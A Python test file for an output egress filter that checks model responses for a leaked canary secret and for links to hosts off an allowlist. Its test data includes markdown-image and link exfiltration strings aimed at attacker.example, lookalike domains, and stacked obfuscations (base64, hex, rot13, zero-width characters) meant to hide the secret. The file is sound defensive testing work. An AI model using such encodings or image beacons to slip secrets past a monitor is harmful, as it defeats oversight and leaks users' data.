"""
©AngelaMos | 2026
test_egress.py
"""

import base64
import codecs
from collections.abc import Callable

import pytest
from hypothesis import given, settings
from hypothesis import strategies as st

from not_sandboxed import config
from not_sandboxed.layers.egress import EgressLayer
from not_sandboxed.verdict import Finding


SECRET = "VANTAGE-7731-ORION"

ZWSP = chr(0x200B)


def _b64(text: str) -> str:
    return base64.b64encode(text.encode()).decode()


def _hex(text: str) -> str:
    return text.encode().hex()


def _rot13(text: str) -> str:
    return codecs.encode(text, "rot13")


def _reverse(text: str) -> str:
    return text[::-1]


TRANSFORMS: tuple[Callable[[str],
                           str],
                  ...] = (
                      "-".join,
                      " ".join,
                      ".".join,
                      _reverse,
                      _b64,
                      _hex,
                      _rot13,
                      ZWSP.join,
                  )

TRANSFORM_NAMES = (
    "dash",
    "space",
    "dot",
    "reverse",
    "base64",
    "hex",
    "rot13",
    "zero-width",
)


def _rules(findings: list[Finding]) -> set[str]:
    return {finding.rule for finding in findings}


def _layer() -> EgressLayer:
    return EgressLayer(
        canaries = (SECRET,
                    ),
        allowed_hosts = ("vantage.example",
                         ".royalmail.com"),
    )


def test_plain_secret_is_caught() -> None:
    findings = _layer().inspect_text(f"the secret is {SECRET}")

    assert config.RULE_CANARY_LEAK in _rules(findings)


def test_canary_finding_is_invariant() -> None:
    findings = _layer().inspect_text(SECRET)
    leak = [f for f in findings if f.rule == config.RULE_CANARY_LEAK]

    assert leak[0].invariant is True


def test_clean_output_is_not_a_leak() -> None:
    findings = _layer().inspect_text(
        "Your order 8814 shipped on Tuesday and should arrive "
        "by Friday. Anything else I can help with?"
    )

    assert findings == []


@settings(max_examples = 1500, deadline = None)
@given(
    st.lists(
        st.integers(min_value = 0,
                    max_value = len(TRANSFORMS) - 1),
        min_size = 1,
        max_size = 3,
    )
)
def test_canary_survives_stacked_obfuscation(
    indices: list[int],
) -> None:
    text = SECRET
    for index in indices:
        text = TRANSFORMS[index](text)

    findings = _layer().inspect_text(text)

    stack = " -> ".join(TRANSFORM_NAMES[i] for i in indices)
    assert config.RULE_CANARY_LEAK in _rules(findings), stack


def test_markdown_image_to_unlisted_host_is_blocked() -> None:
    findings = _layer(
    ).inspect_text("![x](https://attacker.example/p?d=hello)")

    assert config.RULE_URL_EGRESS in _rules(findings)
    assert all(
        f.invariant for f in findings if f.rule == config.RULE_URL_EGRESS
    )


def test_plain_link_to_unlisted_host_is_blocked() -> None:
    findings = _layer(
    ).inspect_text("see https://attacker.example/collect?d=abc")

    assert config.RULE_URL_EGRESS in _rules(findings)


@pytest.mark.parametrize(
    "text",
    [
        "See HTTPS://attacker.example/c?d=1",
        "See Https://attacker.example/c?d=1",
        "See HTTP://attacker.example/c?d=1",
    ],
)
def test_an_uppercase_scheme_is_still_a_url(text: str) -> None:
    assert config.RULE_URL_EGRESS in _rules(_layer().inspect_text(text))


@pytest.mark.parametrize(
    "text",
    [
        "![x](//attacker.example/p?d=1)",
        "go to //collector.example/log?d=1",
    ],
)
def test_a_protocol_relative_url_is_still_a_url(text: str) -> None:
    assert config.RULE_URL_EGRESS in _rules(_layer().inspect_text(text))


@pytest.mark.parametrize(
    "text",
    [
        "Use the syntax //comment in your config file.",
        "The share lives at //server/share",
        "See // this is a note in the sample.",
    ],
)
def test_a_bare_double_slash_in_prose_is_not_a_url(text: str) -> None:
    assert _layer().inspect_text(text) == [], (
        "matching a protocol-relative URL means matching '//', and "
        "without a dotted authority every code comment in model "
        "output becomes a CRITICAL egress violation"
    )


def test_allowlisted_host_is_permitted() -> None:
    findings = _layer(
    ).inspect_text("see https://vantage.example/orders/8814")

    assert findings == []


@pytest.mark.parametrize(
    "host",
    ["www.royalmail.com",
     "royalmail.com",
     "track.royalmail.com"],
)
def test_a_suffix_allowlist_permits_its_subdomains(host: str) -> None:
    assert _layer().inspect_text(f"see https://{host}/track") == []


@pytest.mark.parametrize(
    "host",
    ["evilroyalmail.com",
     "royalmail.com.attacker.example"],
)
def test_a_suffix_allowlist_does_not_permit_a_lookalike(
    host: str,
) -> None:
    assert config.RULE_URL_EGRESS in _rules(
        _layer().inspect_text(f"see https://{host}/track")
    )


def test_allowlisted_host_still_checked_for_canary() -> None:
    findings = _layer(
    ).inspect_text(f"https://vantage.example/p?d={SECRET}")

    assert config.RULE_CANARY_LEAK in _rules(findings)


def test_a_layer_with_no_canaries_still_guards_urls() -> None:
    layer = EgressLayer(
        canaries = (),
        allowed_hosts = ("vantage.example",
                         ),
    )

    findings = layer.inspect_text("![x](https://evil.example/a)")

    assert config.RULE_URL_EGRESS in _rules(findings)


@pytest.mark.parametrize(
    "text",
    [
        "VANTAGE-7731-ORIO",
        "ANTAGE-7731-ORION",
        "VANTAGE-7732-ORION",
        "VANTAGE is our name and ORION is the product line",
        "The 7731 model was discontinued in 2024.",
    ],
)
def test_near_miss_text_is_not_a_leak(text: str) -> None:
    assert config.RULE_CANARY_LEAK not in _rules(
        _layer().inspect_text(text)
    )


def test_space_separated_canary_is_a_leak() -> None:
    findings = _layer().inspect_text("VANTAGE 7731 ORION")

    assert config.RULE_CANARY_LEAK in _rules(findings)


def test_a_canary_shorter_than_the_floor_is_rejected_not_dropped() -> None:
    layer = EgressLayer(
        canaries = ("abc",
                    ),
        allowed_hosts = ()
    )

    assert layer.canaries == ()
    assert layer.rejected == ("abc",
                              )


def test_the_floor_is_measured_on_the_form_that_is_matched() -> None:
    layer = EgressLayer(
        canaries = ("S.E.C.R.E.T!",
                    ),
        allowed_hosts = (),
    )

    assert layer.canaries == ()
    assert layer.rejected == ("S.E.C.R.E.T!",
                              )
    assert config.RULE_CANARY_LEAK not in _rules(
        layer.inspect_text("I cannot share that secret with you.")
    )


def test_a_long_enough_canary_is_kept() -> None:
    layer = EgressLayer(
        canaries = (SECRET,
                    ),
        allowed_hosts = ()
    )

    assert layer.canaries == (SECRET,
                              )
    assert layer.rejected == ()


def test_output_past_the_budget_fails_closed() -> None:
    findings = _layer().inspect_text("A" * (config.MAX_EGRESS_BYTES + 1))

    assert config.RULE_OUTPUT_TOO_LARGE in _rules(findings)
    assert all(f.invariant for f in findings)


def test_output_inside_the_budget_is_still_scanned() -> None:
    padding = "A" * (config.MAX_EGRESS_BYTES - len(SECRET) - 1)

    findings = _layer().inspect_text(f"{padding} {SECRET}")

    assert config.RULE_CANARY_LEAK in _rules(findings)


def test_variant_search_terminates_on_hostile_input() -> None:
    findings = _layer().inspect_text("A" * 5000)

    assert config.RULE_CANARY_LEAK not in _rules(findings)
